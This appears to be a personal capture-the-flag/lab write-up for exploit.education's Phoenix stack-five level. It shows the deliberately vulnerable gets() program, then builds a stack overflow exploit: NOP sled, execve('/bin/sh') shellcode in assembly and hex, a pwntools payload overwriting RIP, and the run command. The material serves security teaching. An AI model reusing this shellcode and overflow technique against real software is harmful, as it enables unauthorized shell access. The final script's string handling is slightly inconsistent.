
As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

**Hints**

-   Don’t feel like you have to write your own shellcode just yet – there’s plenty on the internet.
-   If you wish to debug your shellcode, be sure to make use of the [breakpoint](https://en.wikipedia.org/wiki/Breakpoint) instruction. On i386 / x86_64, that’s 0xcc, and will cause a SIGTRAP.
-   Make sure you remove those breakpoints after you’re done.

```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

# Solution

Use pattern create and feed in the data to crash the program

![](_attachments/Pasted%20image%2020230324141500.png)

Not too sure what the goal is here, if its just to run shellcode, then we can write a simple hello world in assembly to demonstrate this process.

We need to construct our payload so it resembles:
nop sled -> shellcode -> padding -> rbp -> rip(point this at the start of the stack so the nop sled runs)


```python
from pwn import *

shellcode = b"\xCC"


# build the payload
payload = b"\x90" * 50
#sigtrap for testing
payload += shellcode
#padd till end
payload += b"A" * (136 - len(payload))
# overwrite RIP
payload += p64(0x7fffffffe5b0)

print(payload)
```

In order to debug this, use the syntax ` r <<< $(python ~/s5.py)` within gdb.

You will see once the fuction attempts to return from start_level(), it ends up in your nop sled.

![](_attachments/Pasted%20image%2020230324144055.png)

Now we just need to craft some proper shellcode, and be on our way:

```c
; execve("/bin/sh", ["/bin/sh"], NULL)

section .text
		global _start

_start:
		xor     rdx, rdx
		mov     qword rbx, '//bin/sh'
		shr     rbx, 0x8
		push    rbx
		mov     rdi, rsp
		push    rax
		push    rdi
		mov     rsi, rsp
		mov     al, 0x3b
		syscall
```
and compile it into shellcode form with:

```bash
nasm -f elf64 es.s -g ;ld -s es.o -o es
objcopy -j.text -O binary es shellFormat.bin
hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellFormat.bin
```

This will output in a python friendly form, for copy pasting into your script.
```python
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
```

none of my shellcodes work inside the VM... kinda lame. Heres one i pulled from `https://shell-storm.org/shellcode/files/shellcode-806.html`

```python
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
```

This one does the trick.

So now the final solution is:

```python
#!/usr/bin/env python
from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# build the payload
payload = b"\x90" * 30
#sigtrap for testing
payload += shellcode
#padd till end
payload += b"A" * (136 - len(payload))
# overwrite RIP
payload += p64(0x7fffffffe5d0)

print(payload)
```

and to run it:

```bash
(python s5.py; cat) | /opt/phoenix/amd64/stack-five
```

You need to use cat to maintain the stdio once your exploit works.


